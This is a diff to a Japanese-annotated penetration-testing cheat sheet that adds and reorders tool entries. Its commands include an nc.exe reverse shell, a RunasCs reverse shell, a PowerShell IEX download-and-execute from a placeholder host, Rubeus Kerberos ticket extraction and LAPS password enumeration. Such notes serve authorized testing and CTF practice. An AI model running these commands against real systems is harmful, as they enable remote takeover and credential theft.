@@ -406,6 +406,14 @@ impacket-smbserver 'SHARENAME' 'PATH'
 # smbv1が無効の場合は
 impacket-smbserver -smb2support 'SHARENAME' 'PATH'
 ```
+- impacket-ticketConverter
+```sh
+impacket-ticketConverter 'KIRBI' 'CCACHE'
+```
+- impacket-describeTicket
+```sh
+impacket-describeTicket 'CCACHE'
+```
 - ivan-sincek ![GitHub Repo stars](https://img.shields.io/github/stars/ivan-sincek/php-reverse-shell?style=social)
 - john ![GitHub Repo stars](https://img.shields.io/github/stars/openwall/john?style=social)
 ```sh
@@ -476,14 +484,22 @@ sqlite> SELECT * FROM 'TABLE_NAME';
 # execute 64bit process on 32bit process
 C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe
 ```
-- [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) ![GitHub Repo stars](https://img.shields.io/github/stars/leoloobeek/LAPSToolkit?style=social)
+- LAPSToolkit ![GitHub Repo stars](https://img.shields.io/github/stars/leoloobeek/LAPSToolkit?style=social)
 ```powershell
 Find-AdmPwdExtendedRights
 Find-LAPSDelegatedGroups
 Get-LAPSComputers
 ```
+- nc
+```powershell
+nc.exe -e cmd 'IP_REVERSE' 'PORT_REVERSE'
+```
+- netstat
+```powershell
+netstat -ano -p tcp
+```
 - powershell  
-  [nishang](https://github.com/samratashok/nishang) ![GitHub Repo stars](https://img.shields.io/github/stars/samratashok/nishang?style=social)
+  nishang ![GitHub Repo stars](https://img.shields.io/github/stars/samratashok/nishang?style=social)
 ```powershell
 # enum
 [Environment]::Is64BitOperatingSystem
@@ -495,6 +511,9 @@ Get-ADObject -LDAPFilter '(FILTER)' -IncludeDeletedObjects -Property * -SearchBa
 
 # iex
 IEX(new-object net.webclient).downloadstring('http://IP/.ps1')
+
+# download
+Invoke-Webrequest 'URL' -outfile 'FILENAME'
 ```
 - reg
 ```powershell
@@ -506,13 +525,13 @@ reg query "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Shares"
 # SeBackupPrivilege
 robocopy 'SOURCE DIRECTORY' 'DEST DIRECTORY' 'SOURCE FILE' /B /NFL /NDL /NJH /NJS
 ```
+- rubeus ![GitHub Repo stars](https://img.shields.io/github/stars/GhostPack/Rubeus?style=social)
+```powershell
+.\rubeus.exe tgtdeleg /nowrap
+```
 - runascs ![GitHub Repo stars](https://img.shields.io/github/stars/antonioCoco/RunasCs?style=social)
 ```powershell
 .\RunasCs.exe 'USERNAME' 'PASSWORD' cmd -r 'IP_REVERSE':'PORT_REVERSE'
-```
-- netstat
-```powershell
-netstat -ano -p tcp
 ```
 - sc.exe
 ```powershell
